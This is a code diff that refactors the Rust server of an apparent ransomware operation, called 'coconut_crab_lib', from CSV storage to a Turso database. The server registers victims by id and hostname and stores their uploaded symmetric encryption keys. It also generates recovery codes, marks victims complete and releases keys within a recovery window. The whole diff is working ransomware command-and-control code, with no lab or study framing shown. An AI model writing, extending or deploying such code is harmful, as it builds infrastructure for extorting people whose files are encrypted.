@@ -5,21 +5,16 @@ use axum::{
 };
 use axum_embed::ServeEmbed;
 use axum_server::tls_rustls::RustlsConfig;
-use csv::{ReaderBuilder, WriterBuilder};
 use hex::{decode, encode};
 use log::{debug, error, info, warn};
 use rand::{RngExt, SeedableRng, rngs::StdRng};
 use rust_embed::RustEmbed;
-use serde::{Deserialize, Serialize};
-use std::{
-    fs::File,
-    net::SocketAddr,
-    path::Path as FileSystemPath,
-    sync::{Arc, Mutex},
-    time::SystemTime,
-};
+use std::{net::SocketAddr, time::SystemTime};
 
 mod config;
+mod models;
+
+use models::Victim;
 
 const RSA_LIMBS: usize = 32; // RSA key size in 64 bit limbs (2048 bits / 64 = 32)
 
@@ -35,20 +30,9 @@ use coconut_crab_lib::{
     },
 };
 
-#[derive(Deserialize, Serialize, Debug, Clone)]
-struct Victim {
-    id: String,
-    hostname: String,
-    key: String,
-    code: String,
-    upload_time: u64,
-    complete: bool,
-}
-
 #[derive(Clone)]
 struct AppState {
-    victims: Arc<Mutex<Vec<Victim>>>,
-    file_path: String,
+    db: toasty::Db,
 }
 
 #[derive(RustEmbed, Clone)]
@@ -65,14 +49,24 @@ async fn main() {
         .filter_level(log::LevelFilter::Debug)
         .init();
 
-    let exe_directory_path = get_exe_path_dir();
-
-    let file_path = format!("{}/victims.csv", exe_directory_path.to_string_lossy());
-    let victims = import_csv(&file_path);
-    let shared_state = AppState {
-        victims: Arc::new(Mutex::new(victims)),
-        file_path,
+    let db_path = {
+        let exe_directory_path = get_exe_path_dir();
+        format!("turso:{}/victims.db", exe_directory_path.to_string_lossy())
     };
+    debug!("Database path: {db_path}");
+
+    let db = toasty::Db::builder()
+        .models(toasty::models!(Victim))
+        .connect(&db_path)
+        .await
+        .expect("Failed to connect to Turso database");
+
+    db.push_schema()
+        .await
+        .expect("Failed to push database schema");
+    debug!("Database schema pushed");
+
+    let shared_state = AppState { db };
     debug!("Web Application State Configured");
 
     let serve_public_assets = ServeEmbed::<AssetPublic>::new();
@@ -111,55 +105,6 @@ async fn main() {
     debug!("Web Server Started");
 }
 
-fn import_csv<P: AsRef<FileSystemPath>>(file_path: P) -> Vec<Victim> {
-    let mut victims = Vec::<Victim>::new();
-    let file = match std::fs::File::open(file_path.as_ref()) {
-        Ok(file) => {
-            debug!("Existing CSV file found: {}", file_path.as_ref().display());
-            file
-        }
-        Err(error) => {
-            warn!("Existing CSV file not found: {error:?}");
-            return victims;
-        }
-    };
-
-    let mut reader = ReaderBuilder::new().has_headers(true).from_reader(file);
-    for row in reader.deserialize() {
-        let record = match row {
-            Ok(record) => {
-                debug!("Adding Deserialized Victim: {record:?}");
-                record
-            }
-            Err(error) => {
-                error!("Failed To Deserialize Victim: {error}");
-                continue;
-            }
-        };
-        victims.push(record);
-    }
-    victims
-}
-
-fn export_csv<P: AsRef<FileSystemPath>>(file_path: P, victims: &[Victim]) {
-    let file = File::create(file_path).expect("Error accessing filesystem for CSV");
-    let mut writer = WriterBuilder::new().has_headers(true).from_writer(file);
-
-    for victim in victims {
-        writer
-            .serialize(victim)
-            .expect("Failed to serialize victims");
-    }
-
-    writer.flush().expect("Failed to flush to file");
-}
-
-fn get_victim<'a>(victims: &'a mut [Victim], id: &str) -> Option<&'a mut Victim> {
-    victims
-        .iter_mut()
-        .find(|existing_victim| existing_victim.id == *id)
-}
-
 fn generate_code() -> String {
     let mut rng = StdRng::from_rng(&mut rand::rng());
     let code: String = (0..4)
@@ -183,11 +128,11 @@ fn generate_code() -> String {
     code
 }
 
-fn get_epoch_time() -> u64 {
+fn get_epoch_time() -> i64 {
     match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
         Ok(time) => {
             debug!("Reported Time: {time:?}");
-            time.as_secs()
+            time.as_secs() as i64
         }
         Err(error) => {
             error!("Reported time before UNIX Epoch: {error}");
@@ -283,36 +228,30 @@ async fn register(
         return String::from("Invalid Proof");
     }
 
-    let result = {
-        let victim_exists = state.victims.lock().expect("Mutex was poisoned")
-            .iter().any(|v| v.id == registration.id);
+    let mut db = state.db.clone();
 
-        if victim_exists {
-            warn!("[{}] Existing Victim Found", registration.id);
-            warn!("[{}] Cannot Register New Victim", registration.id);
-            String::from("Victim already exists")
-        } else {
-            let victim = Victim {
-                id: registration.id,
-                hostname: registration.hostname,
-                key: String::new(),
-                code: String::new(),
-                upload_time: 0,
-                complete: false,
-            };
-            info!("[{}] Adding New Victim: {:?}", victim.id, victim);
-            state.victims.lock().expect("Mutex was poisoned").push(victim);
-            String::from("Success")
-        }
-    };
+    let victim_exists = Victim::get_by_id(&mut db, &registration.id).await.is_ok();
 
-    if result == "Success" {
-        let victims = state.victims.lock().expect("Mutex was poisoned");
-        export_csv(&state.file_path, &victims);
-        debug!("Updated Victims CSV");
+    if victim_exists {
+        warn!("[{}] Existing Victim Found", registration.id);
+        warn!("[{}] Cannot Register New Victim", registration.id);
+        String::from("Victim already exists")
+    } else {
+        info!("[{}] Adding New Victim", registration.id);
+        toasty::create!(Victim {
+            id: registration.id.clone(),
+            hostname: registration.hostname.clone(),
+            key: String::new(),
+            code: String::new(),
+            upload_time: 0,
+            complete: false,
+        })
+        .exec(&mut db)
+        .await
+        .expect("Failed to insert victim");
+        debug!("Inserted new victim into database");
+        String::from("Success")
     }
-
-    result
 }
 
 async fn upload_sym_key(
@@ -363,30 +302,37 @@ async fn upload_sym_key(
         return String::from("Invalid Proof");
     }
 
-    {
-        let mut victims = state.victims.lock().expect("Mutex was poisoned");
-        if let Some(existing_victim) = get_victim(&mut victims, &uploadsymkey.id) {
-            existing_victim.key = uploadsymkey.key;
-            info!(
-                "[{}] Added Symmetric Key: {}",
-                uploadsymkey.id, existing_victim.key
-            );
-            existing_victim.code = generate_code();
-            info!("[{}] Added Code: {}", uploadsymkey.id, existing_victim.code);
-            existing_victim.upload_time = get_epoch_time();
-            info!(
-                "[{}] Added Upload Time: {:?}",
-                uploadsymkey.id, existing_victim.upload_time
-            );
-            export_csv(&state.file_path, &victims);
-            debug!("Updated Victims CSV");
-            String::from("Success")
-        } else {
+    let mut db = state.db.clone();
+
+    let mut victim = match Victim::get_by_id(&mut db, &uploadsymkey.id).await {
+        Ok(victim) => victim,
+        Err(_) => {
             warn!("[{}] Existing Victim Not Found", uploadsymkey.id);
             warn!("[{}] Cannot Upload Symmetric Key", uploadsymkey.id);
-            String::from("Victim does not exist")
+            return String::from("Victim does not exist");
         }
-    }
+    };
+
+    let code = generate_code();
+    let upload_time = get_epoch_time();
+
+    victim
+        .update()
+        .key(uploadsymkey.key.clone())
+        .code(code.clone())
+        .upload_time(upload_time)
+        .exec(&mut db)
+        .await
+        .expect("Failed to update victim");
+
+    info!("[{}] Added Symmetric Key: {}", uploadsymkey.id, victim.key);
+    info!("[{}] Added Code: {}", uploadsymkey.id, victim.code);
+    info!(
+        "[{}] Added Upload Time: {}",
+        uploadsymkey.id, victim.upload_time
+    );
+
+    String::from("Success")
 }
 
 async fn announce_completion(
@@ -436,20 +382,26 @@ async fn announce_completion(
         return String::from("Invalid Proof");
     }
 
-    {
-        let mut victims = state.victims.lock().expect("Mutex was poisoned");
-        if let Some(existing_victim) = get_victim(&mut victims, &announcecompletion.id) {
-            info!("[{}] Designating As Complete", announcecompletion.id);
-            existing_victim.complete = true;
-            export_csv(&state.file_path, &victims);
-            debug!("Updated Victims CSV");
-            String::from("Success")
-        } else {
+    let mut db = state.db.clone();
+
+    let mut victim = match Victim::get_by_id(&mut db, &announcecompletion.id).await {
+        Ok(victim) => victim,
+        Err(_) => {
             warn!("[{}] Existing Victim Not Found", announcecompletion.id);
             warn!("[{}] Cannot Announce Completion", announcecompletion.id);
-            String::from("Victim does not exist")
+            return String::from("Victim does not exist");
         }
-    }
+    };
+
+    info!("[{}] Designating As Complete", announcecompletion.id);
+    victim
+        .update()
+        .complete(true)
+        .exec(&mut db)
+        .await
+        .expect("Failed to update victim");
+
+    String::from("Success")
 }
 
 #[allow(clippy::too_many_lines)]
@@ -510,21 +462,22 @@ async fn download_sym_key(
         return String::from("Invalid Proof");
     }
 
-    let existing_victim;
-    {
-        let mut victims = state.victims.lock().expect("Mutex was poisoned");
-        existing_victim = if let Some(victim) = get_victim(&mut victims, &downloadsymkey.id) {
+    let mut db = state.db.clone();
+
+    let existing_victim = match Victim::get_by_id(&mut db, &downloadsymkey.id).await {
+        Ok(victim) => {
             debug!(
                 "[{}] Existing Victim Found: {:?}",
                 downloadsymkey.id, victim
             );
-            victim.clone()
-        } else {
+            victim
+        }
+        Err(_) => {
             warn!("[{}] Existing Victim Not Found", downloadsymkey.id);
             warn!("[{}] Cannot Download Symmetric Key", downloadsymkey.id);
             return String::from("Victim does not exist");
-        };
-    }
+        }
+    };
 
     let mut recovery_valid = false;
     if !existing_victim.complete && downloadsymkey.code == "0000-0000-0000" {
@@ -547,7 +500,7 @@ async fn download_sym_key(
                 "[{}] Elapsed Time: {} seconds",
                 downloadsymkey.id, elapsed_time
             );
-            if elapsed_time <= recovery_window {
+            if elapsed_time <= recovery_window as i64 {
                 recovery_valid = true;
             }
         }
